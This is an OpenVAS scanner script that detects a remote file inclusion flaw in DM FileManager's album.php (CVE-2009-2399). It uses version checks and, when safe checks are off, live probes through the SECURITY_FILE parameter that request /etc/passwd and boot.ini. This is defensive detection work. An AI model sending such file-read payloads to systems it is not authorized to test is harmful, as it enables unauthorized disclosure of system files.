###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dm_filemanager_file_inc_vuln.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# DM FileManager 'album.php' Remote File Inclusion Vulnerability
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH, http://www.greenbone.net
#
# Exploit path is changed in exploit code
#   - By Sharath S <sharaths@secpod.com> On 2009-07-22
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will let the remote attacker execute arbitrary PHP
  code, and can include arbitrary file from local or external resources when
  register_globals is enabled.
  Impact Level: Application";
tag_affected = "DutchMonkey, DM FileManager version 3.9.4 and prior";
tag_insight = "Error exists when input passed to the 'SECURITY_FILE' parameter in 'album.php'
  in 'dm-albums/template/' directory is not properly verified before being used to
  include files.";
tag_solution = "Apply Security patch from below link,
  http://www.dutchmonkey.com/?file=products/dm-albums/download_form.html";
tag_summary = "The host is running DM FileManager and is prone to remote File
  Inclusion vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800836");
  script_version("$Revision: 9350 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2009-07-15 13:05:34 +0200 (Wed, 15 Jul 2009)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-2399");
  script_bugtraq_id(35521);
  script_name("DM FileManager 'album.php' Remote File Inclusion Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/35622");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/35521/exploit");
  script_xref(name : "URL" , value : "http://www.dutchmonkey.com/?label=Latest+News+%26+Announcements#20090704");

  script_tag(name:"qod_type", value:"remote_banner");
  script_category(ACT_GATHER_INFO);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_dm_filemanager_detect.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

dmfPort = get_http_port(default:80);
if(!dmfPort){
  exit(0);
}

dmfVer = get_kb_item("www/" + dmfPort + "/DM-FileManager");
dmfVer = eregmatch(pattern:"^(.+) under (/.*)$", string:dmfVer);

if(dmfVer[2] != NULL && !safe_checks())
{
  foreach exploit (make_list("etc/passwd", "boot.ini"))
  {
    sndReq = http_get(item:dmfVer[2] + "/dm-albums/template/album.php?" +
                                       "SECURITY_FILE=/" + exploit,
                      port:dmfPort);
    rcvRes = http_send_recv(data:sndReq, port:dmfPort);

    if(rcvRes =~ "root:x:0:[01]:.*" || rcvRes =~ "\[boot loader\]")
    {
      security_message(dmfPort);
      exit(0);
    }
  }
}

if(dmfVer[1] != NULL)
{
  if(version_is_less_equal(version:dmfVer[1], test_version:"3.9.4"))
  {
    security_message(dmfPort);
    exit(0);
  }
}

dmaVer = get_kb_item("www/" + dmfPort + "/DM-Albums");
dmaVer = eregmatch(pattern:"^(.+) under (/.*)$", string:dmaVer);
if(dmaVer[1] != NULL)
{
  if(version_is_less(version:dmaVer[1], test_version:"1.9.3")){
    security_message(dmfPort);
  }
}
